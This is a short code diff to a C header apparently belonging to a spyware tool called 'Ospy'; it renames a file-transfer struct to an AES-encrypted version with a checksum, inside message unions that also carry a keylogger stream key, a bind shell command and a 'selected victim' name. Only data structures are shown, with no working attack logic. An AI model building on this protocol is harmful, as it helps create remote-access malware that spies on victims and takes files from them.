@@ -89,9 +89,10 @@ typedef struct {
 
 
 typedef struct {
-	char file_sub_buffer[MTU];
-	int end_of_file;
-} file_transformation_protocol;
+	char file_sub_buffer[MTU]; // Will contain sub-buffer of the file converted to bade 64 with aes 256 CBC encryption
+	int end_of_file; // Will contain 0 unless the function reached the end of the file
+	char checksum[HASH_LEN]; // 'checksum' will contain 0s, when the function reached the end of the file 'checksum' will contain the checksum of the file.
+} encrypted_file_transformation_protocol; // In this convention, the receiver will know when the end of the file arrived and if all the file arrive successfully
 
 typedef union{
 	log_in_protocol login_to_Ospy;
@@ -100,7 +101,7 @@ typedef union{
 	char keylogger_stream_key[MAX_KEYSTROKE_LEN];
 	char bind_shell_command[MAX_BIND_SHELL_COMMAND];
 	char selected_victim_name[MAX_USER_NAME_LEN];
-	file_transformation_protocol file_data;
+	encrypted_file_transformation_protocol file_data;
 } main_data;
 
 typedef union{
@@ -111,7 +112,7 @@ typedef union{
 	char keylogger_stream_key[ENCRYPTED_TEXT_LEN(MAX_KEYSTROKE_LEN)];
 	char bind_shell_command[ENCRYPTED_TEXT_LEN(MAX_BIND_SHELL_COMMAND)];
 	char selected_victim_name[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
-	file_transformation_protocol file_data;
+	encrypted_file_transformation_protocol file_data;
 } encrypted_main_data;
 
 typedef struct {
